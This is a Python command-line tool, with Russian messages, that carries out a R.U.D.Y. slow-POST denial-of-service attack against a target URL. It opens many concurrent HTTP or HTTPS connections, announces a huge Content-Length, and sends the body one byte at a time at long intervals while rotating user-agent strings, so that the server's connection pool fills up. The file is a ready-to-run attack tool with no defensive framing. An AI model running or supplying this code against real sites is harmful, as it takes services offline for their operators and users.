import socket
import ssl
import argparse
import time
import random
import string
from urllib.parse import urlparse, ParseResult
from concurrent.futures import ThreadPoolExecutor
from typing import Optional


class RUDYAttack:
    def __init__(self, url: str, sockets: int = 150, time_interval: float = 10, content_length: int = 1000000, timeout: int = 5, proxy: Optional[str] = None) -> None:
        self.url: ParseResult = urlparse(url)
        self.sockets_count: int = sockets
        self.time_interval: float = time_interval
        self.content_length: int = content_length
        self.timeout: int = timeout
        self.proxy: Optional[str] = proxy
        self.user_agents: list[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]
        self.is_running: bool = True

    def generate_payload(self) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=self.content_length))

    def create_socket(self) -> socket.socket:
        sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)

        if self.url.scheme == 'https':
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=self.url.hostname)

        sock.connect((self.url.hostname, self.url.port or (443 if self.url.scheme == 'https' else 80)))
        return sock

    def send_slow_request(self, sock: socket.socket) -> None:
        path = self.url.path or '/'
        headers: list[str] = [
            f"POST {path} HTTP/1.1",
            f"Host: {self.url.hostname}",
            f"User-Agent: {random.choice(self.user_agents)}",
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {self.content_length}",
            "Connection: keep-alive\r\n\r\n"
        ]

        try:
            sock.send('\r\n'.join(headers).encode())

            payload = self.generate_payload()
            for i in range(0, len(payload), 1):
                if not self.is_running:
                    break
                sock.send(payload[i].encode())
                time.sleep(self.time_interval)

        except Exception as e:
            print(f"[*] Ошибка соединения: {e}")
        finally:
            sock.close()

    def start(self) -> None:
        """Запуск атаки с использованием пула потоков"""
        with ThreadPoolExecutor(max_workers=self.sockets_count) as executor:
            while self.is_running:
                try:
                    sock = self.create_socket()
                    executor.submit(self.send_slow_request, sock)
                    time.sleep(0.5)
                except Exception as e:
                    print(f"[*] Ошибка создания сокета: {e}")

    def stop(self) -> None:
        self.is_running = False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="RUDYAttack.py - Инструмент для проведения медленных POST-атак (R.U.D.Y.)"
    )
    parser.add_argument("url", help="Целевой URL (http:// или https://)")
    parser.add_argument("-s", "--sockets", type=int, default=150,
                        help="Количество одновременных соединений")
    parser.add_argument("-t", "--time", type=float, default=10,
                        help="Интервал между отправкой байтов (секунды)")
    parser.add_argument("-l", "--length", type=int, default=1000000,
                        help="Значение Content-Length для заголовка")
    parser.add_argument("--timeout", type=int, default=5,
                        help="Таймаут соединения")

    args = parser.parse_args()

    print("""
 ██▀███   █    ██    ▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▓██   ██▓▓█████▄▄▄█████▓
▓██ ▒ ██▒ ██  ▓██▒   ▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌    ▒██  ██▒▓█   ▀▓  ██▒ ▓▒
▓██ ░▄█ ▒▓██  ▒██░   ░██   █▌▒███  ▒██  ▀█▄  ░██   █▌     ▒██ ██░▒███  ▒ ▓██░ ▒░
▒██▀▀█▄  ▓▓█  ░██░   ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌     ░ ▐██▓░▒▓█  ▄░ ▓██▓ ░ 
░██▓ ▒██▒▒▒█████▓    ░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓      ░ ██▒▓░░▒████▒ ▒██▒ ░ 
░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒     ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒       ██▒▒▒ ░░ ▒░ ░ ▒ ░░   
  ░▒ ░ ▒░░░▒░ ░ ░     ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ▓██ ░▒░  ░ ░  ░   ░    
  ░░   ░  ░░░ ░ ░     ░ ░  ░    ░    ░   ▒    ░ ░  ░     ▒ ▒ ░░     ░    ░      
   ░        ░           ░       ░  ░     ░  ░   ░        ░ ░        ░  ░        
                      ░                       ░          ░ ░                     
    """)

    attacker = RUDYAttack(
        url=args.url,
        sockets=args.sockets,
        time_interval=args.time,
        content_length=args.length,
        timeout=args.timeout
    )

    try:
        attacker.start()
    except KeyboardInterrupt:
        attacker.stop()
        print("\n[*] Атака остановлена пользователем")
